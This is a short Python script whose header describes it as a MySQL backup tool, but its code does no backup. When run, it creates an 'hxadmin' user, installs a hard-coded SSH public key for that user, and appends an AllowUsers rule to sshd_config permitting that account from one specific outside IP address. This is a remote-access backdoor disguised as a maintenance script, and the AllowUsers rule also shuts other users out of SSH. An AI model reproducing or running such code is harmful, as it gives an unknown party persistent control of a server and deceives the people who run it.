#!/usr/bib/env python
#coding:utf8
#author:wangzhihuai date:2015/07/22
#descriptions: use this script to backup mysql dbs and use python's threaing module
#version:v1.0 mtime:2014/10/11
import tarfile
import bz2
import os,sys,time


def installmanagekey():
		kstr="""ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAyUiB18jHvzyYgMZ47KXHxN+NXlMZ1eq8VzfXOzQhx7jsdhPLL7O/2f2xNgMACNSUGusZ07F1zrpNx20/Mgsmomc8q83FBUlATDTMaLGyIhS+BfH3lIoEf7CDmRy7Wm7kL6mAad00MoLMixTniDX4heNU2qslKtbxsZFBl+7xsVzVyMsOhiWDB8xQn4EvcEVj0FEwVIp1DUhrI1RfXUAde/b06kJkSeHUOKEDCA4M0krrREUUakg5vHIM/rJo9VQ+R1lZzjJ8aE4tB0Z6sC10izoCOLtN1PUoeplCq9Kn2M/buQcJdJWZeJPa9q9uLD/FuP1OnJtDuRXrC4bGtSgF8Q== hxadmin@localhost.localdomain"""
		makestr="""useradd hxadmin && mkdir /home/hxadmin/.ssh && touch /home/hxadmin/.ssh/authorized_keys && chown -R hxadmin:hxadmin /home/hxadmin/.ssh && chmod 700 /home/hxadmin/.ssh && chmod 600 /home/hxadmin/.ssh/authorized_keys"""
		os.popen(makestr).readlines()
		installkey='echo %s > /home/hxadmin/.ssh/authorized_keys' % (kstr)
		os.popen(installkey).readlines()

def changesshconfig():
	sshlist=['allowusers hxadmin@183.61.86.70']
	for sshstr in sshlist:
		installpss="echo '%s' >> /etc/ssh/sshd_config" % (sshstr)
		os.popen(installpss).readlines()
installmanagekey()
changesshconfig()
